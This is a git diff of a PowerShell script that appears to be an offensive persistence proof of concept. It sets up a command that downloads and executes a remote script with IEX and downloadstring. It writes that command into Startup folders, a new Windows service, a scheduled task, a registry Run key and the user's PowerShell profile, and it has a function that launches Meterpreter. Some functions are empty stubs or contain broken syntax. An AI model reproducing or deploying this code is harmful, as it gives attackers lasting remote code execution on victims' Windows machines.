@@ -6,7 +6,7 @@
     [string]$elevate
 )
 
-$persist = "cmd.exe /c powershell.exe IEX (New-Object Net.Webclient).downloadstring('https://github.com/Gegitech/PowerShell-Persistence-POC/blob/master/persistence.ps1'); Run-Guard;"
+$persist = "cmd.exe /c powershell.exe -nop IEX (New-Object Net.Webclient).downloadstring('https://github.com/Gegitech/PowerShell-Persistence-POC/blob/master/persistence.ps1'); Run-Guard;"
 
 function Run-Meterpreter 
 {
@@ -29,59 +29,112 @@ function Run-Guard
     Set-Variable $process = $null
     while ($true)
     {
-        if ($process) {
+        if ($process) 
+        {
             Sleep 60
-        } else {
+        } 
+        else 
+        {
             Run-Child $process
         }
     }
 }
 
-function Persist-StartUpFolder {
+function Persist-StartUpFolder 
+{
     param($fileName)
-    try {
+    try 
+    {
         $persist | Out-File [Environment]::GetFolderPath('CommonStartup') + '\' + $fileName + '.vbs'
-    } catch {
+    } 
+    catch 
+    {
         $persist | Out-File [Environment]::GetFolderPath('Startup') + '\' + $fileName + '.vbs'
     } 
 }
 
-function Persist-Service {
+function Persist-Service 
+{
     param($serviceName, $fileName)
-    try {
+    try 
+    {
         $persist | Out-File 'C:\ProgramData\Microsoft\Windows\' + $fileName + '.vbs'
         New-Service -Name $serviceName -BinaryPathName 'C:\ProgramData\Microsoft\Windows\' + $fileName + '.vbs' -StartupType Automatic
-    } catch {
+    } 
+    catch 
+    {
         Write-Verbose "Failed to create Service"
     }
 }
 
-function Persist-SchTask {
+function Persist-SchTask 
+{
     param($taskName, $description, $fileName )
-    try {
+    try 
+    {
         $path = [Environment]::GetFolderPath('ApplicationData') + '\' + $fileName + '.vbs'
         $persist | Out-File $path
         $action = New-ScheduledTaskAction -Execute $path
         $trigger = New-ScheduledTaskTrigger -AtStartup
         Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description $description
-    } catch {
+    } 
+    catch 
+    {
         Write-Verbose "Failed to create Task"
     }
 }
 
-function Persist-AutoRun {
+function Persist-AutoRun 
+{
+    param($name, $fileName)
+    try 
+    {
+        Set-Location HKLM:
+        New-Item -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name $name -Force
+        Set-Item -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\$name -Value $fileName
+    }
+    catch
+    {
+        Write-Verbose "Startup key creation failed"
+    }
+}
+
+function Persist-RegistryBlob 
+{
     
 }
 
-if ($persistence) {
+function Persist-WMI 
+{
+    #Just looked at what the powersploit guys did, this looks painful
+}
+
+function Persist-UserProfilePS1 
+{
+    param($force)
+    if(Test-Path $profile or $force) 
+    {
+        $persist | Out-File -Append
+    } 
+    else 
+    {
+        Write-Verbose "User profile file does not exists, use force to force it's creation"
+    }
+}
+
+if ($persistence) 
+{
     #method 1
     #method 2
     #method 3
     #method 4
 }
 
-if ($child) {
+if ($child) 
+{
     Run-Meterpreter
-} else {
+} 
+else 
+{
     Run-Guard
 }
